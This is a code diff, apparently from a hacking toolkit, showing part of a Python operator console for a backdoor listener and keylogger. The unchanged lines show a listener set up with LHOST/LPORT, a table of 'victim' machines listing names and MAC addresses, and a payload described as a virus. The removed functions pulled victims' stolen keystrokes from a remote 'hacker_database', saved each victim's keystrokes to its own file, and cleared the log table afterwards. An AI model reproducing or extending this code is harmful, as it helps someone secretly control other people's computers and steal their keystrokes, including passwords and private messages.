@@ -18,7 +18,7 @@ def print_backdoor_listener_options(inputs_dict):
     descriptions = {
         'LPORT':'This is the name of the final executable',
         'LHOST': 'This is the program ID of the virus',
-        'P_ID': 'Number of seconds it sleeps during work'
+        'PID': 'Number of seconds it sleeps during work'
     }
 
     print(colors.RESET, end='')
@@ -27,8 +27,9 @@ def print_backdoor_listener_options(inputs_dict):
         try:
             single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
             table_data.append(single_data)
-        except KeyError as fuck:
+        except KeyError:
             pass
+        
     table = AsciiTable(table_data)
     print(table.table, end='\n\n')
 
@@ -75,7 +76,7 @@ def show_victim_data():
         
         data = list(map(list,my_cursor.fetchall()))
 
-        header = [[colors.BOLD + 'P_ID', 'Name', 'MAC address', 'Selected' + colors.RESET]]
+        header = [[colors.BOLD + 'PID', 'Name', 'MAC address', 'Selected' + colors.RESET]]
 
         table = AsciiTable(header + data)
         print(table.table)
@@ -87,93 +88,6 @@ def show_victim_data():
     except Exception as error:
         print(colors.Red + '[✘]Error occured during the proccess')
         print('[✘]{}'.format(error) + colors.RESET)
-
-
-def read_online_keys():
-    try:
-        global program_path
-        credentials = read_credential_file(program_path)
-
-        try:
-
-            hacker_database = connect(
-                host     = credentials['Server'],
-                user     = credentials['Username'],
-                passwd   = credentials['Password'],
-                database = credentials['Database'],
-                port     = credentials['Port']
-            )
-
-            # reading the data base
-            my_cursor = hacker_database.cursor()
-            command = "SELECT * FROM `key_logs`"
-            my_cursor.execute(command)
-            data = my_cursor.fetchall()
-
-            report = extract_write_data(data)
-            heading = ['P_ID', 'MAC_ADDR', 'LOG stat', 'Process stat']
-
-            draw_table(heading, report)
-
-            # clear the data base
-            command = "UPDATE `key_logs` SET `keys` = ''"
-            my_cursor.execute(command)
-
-            print(colors.Green + '\n[✔]Database cleared\n' + colors.RESET)
-
-            hacker_database.commit()
-
-        except Exception as e:
-            print(colors.Red + '[✘]Error occurred while connecting to the database')
-            print(colors.Red + '[✘]' + e + colors.RESET)
-            exit(0)
-
-    except:
-        print(colors.Red + '[✘]Error reading credentials' + colors.RESET)
-        exit(0)
-
-
-def extract_write_data(data_list):
-    global program_path
-    try:
-        call(f"mkdir '{program_path}'/keylogs", shell=True)
-    except:
-        pass
-
-    print('\n' + colors.Cyan + '[✔]Directory keylogs created')
-    print(colors.Cyan + '[✔]Processing data' + colors.RESET, end='')
-
-    # crete a empty list to append process report
-    extract_report = []
-
-    for row in data_list:
-
-        p_id = row[0]
-        mac_address = row[1]
-        one_row_report = [p_id, mac_address]
-
-        try:
-            log = row[2]
-            if len(log) > 0:
-                one_row_report.append(colors.Green + 'LOGGED' + colors.RESET)
-                with open(f"{program_path}/keylogs/p_id_{p_id}.txt", 'a') as log_file:
-                    log_file.write('\n\n\n\n\n')
-                    log_file.write(log)
-
-            else:
-                one_row_report.append(colors.Red + 'NO LOG' + colors.RESET)
-
-            one_row_report.append('Completed')
-
-        except Exception as error:
-            while len(one_row_report) < 3:
-                one_row_report.append('')
-            print(error)
-            one_row_report.append('Error')
-
-        extract_report.append(one_row_report)
-
-    return extract_report
 
 
 def draw_table(heading, data):
@@ -199,7 +113,7 @@ def activate_listener():
     saved_inputs_dict = {
         'LPORT':'4343',
         'LHOST': private_ip,
-        'P_ID': '1'
+        'PID': '1'
     }
 
     while True:
@@ -211,9 +125,6 @@ def activate_listener():
 
         elif command == 'clear':
             call('clear', shell=True)
-
-        elif command == 'extract':
-            read_online_keys()
 
         elif command == 'exit' or command == 'quit':
             activated_option.remove(' {}listen({}Backdoor{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
